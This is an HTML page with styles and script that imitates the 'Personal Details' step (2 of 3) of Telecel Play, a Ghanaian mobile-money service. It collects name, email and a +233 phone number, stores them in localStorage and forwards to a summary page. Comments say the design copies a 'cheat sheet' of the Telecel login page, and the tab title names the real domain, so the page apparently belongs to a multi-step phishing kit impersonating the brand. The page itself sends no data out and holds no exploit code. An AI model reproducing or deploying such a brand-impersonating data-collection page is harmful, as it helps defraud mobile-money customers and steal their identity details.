<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=yes">
    <title>Telecel Play | Personal Details – play.telecel.com.gh</title>
    <link rel="icon" href="https://play.telecel.com.gh/favicon.ico" type="image/x-icon">
    <meta name="theme-color" content="#E30613">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            background: #f8f9fc;
            color: #1a1a1a;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            padding: 12px;
        }

        header {
            width: 100%;
            max-width: 480px;
            padding: 12px 16px;
            text-align: center;
            margin-bottom: 12px;
            background: white;
            border-radius: 12px;
            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.06);
            position: relative;
        }

        .back-btn {
            font-size: 28px;
            background: none;
            border: none;
            cursor: pointer;
            color: #2c3e50;
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            line-height: 1;
        }

        .logo {
            font-size: clamp(28px, 7vw, 40px);
            font-weight: 800;
            letter-spacing: -0.5px;
        }

        .logo-telecel {
            color: #E30613;
        }

        .logo-play {
            color: #0033A0;
        }

        main {
            flex: 1;
            max-width: 480px;
            width: 100%;
            margin: 0 auto;
            position: relative;
        }

        .form-card {
            background: white;
            border-radius: 20px;
            padding: 24px 18px 32px;
            box-shadow: 0 12px 48px rgba(0, 0, 0, 0.08);
            position: relative;
            /* for absolute error box */
        }

        /* Error box – exactly like cheat sheet (Telecel login page) */
        .error-box {
            position: absolute;
            top: 12px;
            left: 12px;
            right: 12px;
            background: #fff;
            border: 2px solid #ff4d4d;
            border-radius: 14px;
            padding: 12px;
            display: none;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.12);
            z-index: 100;
            text-align: left;
        }

        .error-title {
            color: #ff0000;
            font-weight: bold;
            font-size: 14px;
            margin-bottom: 4px;
        }

        .error-text {
            color: #444;
            font-size: 13px;
        }

        .close {
            position: absolute;
            right: 12px;
            top: 8px;
            cursor: pointer;
            font-size: 20px;
            color: #999;
        }

        .form-title {
            font-size: clamp(24px, 6vw, 32px);
            font-weight: 700;
            color: #1a1a1a;
            text-align: center;
            margin-bottom: 1.2rem;
        }

        .progress-bar {
            width: 100%;
            height: 8px;
            background: #e9ecef;
            border-radius: 4px;
            margin: 1rem auto 0.8rem;
            overflow: hidden;
        }

        .progress-fill {
            width: 66.66%;
            height: 100%;
            background: linear-gradient(90deg, #E30613, #b71c1c);
            border-radius: 4px;
        }

        .step-text {
            text-align: center;
            color: #6c757d;
            font-size: 0.9rem;
            margin-bottom: 1.8rem;
        }

        .form-group {
            margin-bottom: 1.5rem;
        }

        .form-label {
            display: block;
            font-weight: 600;
            color: #2c3e50;
            margin-bottom: 0.5rem;
            font-size: 0.9rem;
        }

        .form-input {
            width: 100%;
            padding: 0.9rem 1rem;
            border: 1px solid #ced4da;
            border-radius: 10px;
            font-size: 1rem;
            background: #fdfdfe;
            transition: all 0.2s;
        }

        .form-input:focus {
            border-color: #E30613;
            outline: none;
            box-shadow: 0 0 0 3px rgba(227, 6, 19, 0.15);
        }

        /* Invalid highlight (like cheat sheet) */
        .form-input.invalid,
        #phoneGroup.invalid {
            border-color: #dc3545 !important;
            box-shadow: 0 0 0 3px rgba(220, 53, 69, 0.15) !important;
        }

        .name-group {
            display: flex;
            gap: 1rem;
            margin-bottom: 1.5rem;
        }

        .name-group>div {
            flex: 1;
        }

        .btn-group {
            display: flex;
            gap: 1rem;
            margin-top: 2rem;
        }

        .prev-btn,
        .next-btn {
            flex: 1;
            padding: 1rem;
            border-radius: 12px;
            font-size: 1rem;
            font-weight: 700;
            cursor: pointer;
            transition: 0.2s;
            touch-action: manipulation;
        }

        .prev-btn {
            background: #e2e8f0;
            color: #475569;
            border: none;
        }

        .prev-btn:active {
            transform: scale(0.97);
        }

        .next-btn {
            background: linear-gradient(90deg, #E30613, #b71c1c);
            color: white;
            border: none;
            box-shadow: 0 6px 18px rgba(227, 6, 19, 0.25);
        }

        .next-btn:active {
            transform: scale(0.97);
        }

        .next-btn.disabled-btn,
        .next-btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
            transform: none;
        }

        footer {
            padding: 20px 16px;
            color: #adb5bd;
            font-size: 12px;
            text-align: center;
            margin-top: auto;
        }

        /* Spinner overlay – cheat sheet style */
        #spinner {
            position: fixed;
            inset: 0;
            display: none;
            align-items: center;
            justify-content: center;
            background: rgba(255, 255, 255, 0.8);
            backdrop-filter: blur(2px);
            z-index: 999;
        }

        .loader {
            width: 44px;
            height: 44px;
            border: 4px solid #ffe0e0;
            border-top: 4px solid #ff0000;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        /* Extra fine-tuning for small devices (<= 380px) */
        @media (max-width: 380px) {
            body {
                padding: 8px;
            }

            .form-card {
                padding: 20px 14px;
            }

            .form-input {
                padding: 0.8rem 0.9rem;
                font-size: 0.9rem;
            }

            .name-group {
                gap: 0.8rem;
                flex-direction: column;
                margin-bottom: 0.8rem;
            }

            .btn-group {
                gap: 0.8rem;
            }

            .prev-btn,
            .next-btn {
                padding: 0.8rem;
                font-size: 0.9rem;
            }
        }

        /* Maintain original layout on larger screens */
        @media (min-width: 769px) {
            body {
                padding: 32px;
            }

            .form-card {
                padding: 2.5rem 3rem;
            }
        }

        /* Phone group special styling */
        #phoneGroup {
            display: flex;
            align-items: center;
            border: 1px solid #ced4da;
            border-radius: 10px;
            padding: 0 1rem;
            background: #fdfdfe;
        }

        #phoneGroup span {
            color: #6c757d;
            font-weight: 500;
            margin-right: 0.5rem;
        }

        #phoneGroup input {
            flex: 1;
            border: none;
            outline: none;
            padding: 0.9rem 0;
            font-size: 1rem;
            background: transparent;
        }
    </style>
</head>

<body>
    <header>
        <button class="back-btn" onclick="history.back()">←</button>
        <div class="logo"><span class="logo-telecel">Telecel</span><span class="logo-play">Play</span></div>
    </header>
    <main>
        <div class="form-card">
            <!-- Error box – exactly like cheat sheet -->
            <div class="error-box" id="errorBox">
                <div class="close" onclick="hideError()">×</div>
                <div class="error-title">Error</div>
                <div class="error-text" id="errorText">Please fix the highlighted fields.</div>
            </div>

            <h1 class="form-title">Personal Details</h1>
            <div class="progress-bar">
                <div class="progress-fill"></div>
            </div>
            <div class="step-text">Step 2 of 3</div>

            <div class="name-group">
                <div>
                    <label class="form-label">First Name</label>
                    <input type="text" class="form-input" id="firstName" placeholder="e.g. Kwame">
                </div>
                <div>
                    <label class="form-label">Last Name</label>
                    <input type="text" class="form-input" id="lastName" placeholder="e.g. Mensah">
                </div>
            </div>

            <div class="form-group">
                <label class="form-label">Email Address</label>
                <input type="email" class="form-input" id="email" placeholder="e.g. kwame.mensah@example.com">
            </div>

            <div class="form-group">
                <label class="form-label">Phone Number</label>
                <div id="phoneGroup">
                    <span>+233</span>
                    <input type="tel" id="phone" placeholder="55 123 4567" maxlength="11" inputmode="numeric">
                </div>
            </div>

            <div class="btn-group">
                <button class="prev-btn" onclick="history.back()">PREVIOUS</button>
                <button class="next-btn" id="nextBtn">NEXT STEP</button>
            </div>
        </div>
    </main>
    <footer>
        © 2026 Telecel Ghana – Licensed Mobile Financial Services | Powered by Telecel Cash & Telecel Play
    </footer>

    <!-- Spinner overlay (cheat sheet style) -->
    <div id="spinner">
        <div class="loader"></div>
    </div>

    <script>
        // ========== DOM elements ==========
        const firstNameInput = document.getElementById('firstName');
        const lastNameInput = document.getElementById('lastName');
        const emailInput = document.getElementById('email');
        const phoneInput = document.getElementById('phone');
        const phoneGroup = document.getElementById('phoneGroup');
        const nextBtn = document.getElementById('nextBtn');
        const spinner = document.getElementById('spinner');
        const errorBox = document.getElementById('errorBox');
        const errorText = document.getElementById('errorText');

        // Pre-fill from localStorage if available
        if (localStorage.getItem('firstName')) firstNameInput.value = localStorage.getItem('firstName');
        if (localStorage.getItem('lastName')) lastNameInput.value = localStorage.getItem('lastName');
        if (localStorage.getItem('email')) emailInput.value = localStorage.getItem('email');
        if (localStorage.getItem('phone')) phoneInput.value = localStorage.getItem('phone');

        // ========== Helper: show error (exactly like cheat sheet) ==========
        function showError(message) {
            errorText.innerText = message || 'Please fix the highlighted fields.';
            errorBox.style.display = 'block';
        }

        function hideError() {
            errorBox.style.display = 'none';
        }

        // Remove invalid highlight from all fields
        function resetInvalidHighlights() {
            document.querySelectorAll('.form-input, #phoneGroup').forEach(el => {
                el.classList.remove('invalid');
            });
        }

        // ========== LENIENT Validation: accept 9, 10, or 11 digits ==========
        function isValidPhoneNumber(phoneDigits) {
            // Accept 9, 10, or 11 digits (2 more digits than original 9)
            return /^\d{9,11}$/.test(phoneDigits);
        }

        function validateForm() {
            let isValid = true;
            let errorMsg = '';

            // Reset UI
            resetInvalidHighlights();
            hideError();

            const firstName = firstNameInput.value.trim();
            const lastName = lastNameInput.value.trim();
            const phoneRaw = phoneInput.value.trim();

            // First name check
            if (!firstName) {
                firstNameInput.classList.add('invalid');
                isValid = false;
                errorMsg = 'First name is required.';
            } else if (firstName.length < 2) {
                firstNameInput.classList.add('invalid');
                isValid = false;
                errorMsg = 'First name must be at least 2 characters.';
            }

            // Last name check
            if (!lastName) {
                lastNameInput.classList.add('invalid');
                isValid = false;
                if (!errorMsg) errorMsg = 'Last name is required.';
            } else if (lastName.length < 2) {
                lastNameInput.classList.add('invalid');
                isValid = false;
                errorMsg = 'Last name must be at least 2 characters.';
            }

            // Phone number validation (lenient: 9 to 11 digits)
            if (!phoneRaw) {
                phoneGroup.classList.add('invalid');
                isValid = false;
                errorMsg = 'Phone number is required.';
            } else if (!/^\d{9,11}$/.test(phoneRaw)) {
                phoneGroup.classList.add('invalid');
                isValid = false;
                errorMsg = 'Phone number must be 9, 10, or 11 digits (only numbers).';
            } else if (!isValidPhoneNumber(phoneRaw)) {
                phoneGroup.classList.add('invalid');
                isValid = false;
                errorMsg = 'Please enter a valid phone number (9-11 digits).';
            }

            // Email is optional but if provided must be valid
            const email = emailInput.value.trim();
            if (email && (!email.includes('@') || !email.includes('.') || email.length < 5)) {
                emailInput.classList.add('invalid');
                isValid = false;
                errorMsg = 'Please enter a valid email address (e.g., name@domain.com).';
            }

            if (!isValid) {
                showError(errorMsg || 'Please correct the highlighted fields.');
                const firstInvalid = document.querySelector('.invalid');
                if (firstInvalid) firstInvalid.scrollIntoView({ behavior: 'smooth', block: 'center' });
                return false;
            }
            return true;
        }

        // ========== Save data, show spinner, wait 3 seconds, then redirect ==========
        let isProcessing = false;

        function proceedToSummary() {
            if (isProcessing) return;
            if (!validateForm()) return;

            // Save data to localStorage
            localStorage.setItem('firstName', firstNameInput.value.trim());
            localStorage.setItem('lastName', lastNameInput.value.trim());
            localStorage.setItem('email', emailInput.value.trim());
            localStorage.setItem('phone', phoneInput.value.trim());

            // Disable button and show spinner (exactly like cheat sheet)
            nextBtn.disabled = true;
            nextBtn.classList.add('disabled-btn');
            isProcessing = true;
            spinner.style.display = 'flex';

            // 3-second loading simulation before redirect
            setTimeout(() => {
                window.location.href = 'summary.html';
            }, 3000);
        }

        // ========== Event listeners ==========
        nextBtn.addEventListener('click', proceedToSummary);

        // Clear error & highlights when user starts typing again
        const clearErrorOnInput = (el) => {
            el.addEventListener('input', () => {
                hideError();
                el.classList.remove('invalid');
                if (el.id === 'phone') phoneGroup.classList.remove('invalid');
            });
        };
        clearErrorOnInput(firstNameInput);
        clearErrorOnInput(lastNameInput);
        clearErrorOnInput(emailInput);
        clearErrorOnInput(phoneInput);

        // Phone specific: remove invalid from group on input
        phoneInput.addEventListener('input', () => {
            phoneGroup.classList.remove('invalid');
            hideError();
        });

        // Expose hideError globally for close button
        window.hideError = hideError;
    </script>
</body>

</html>
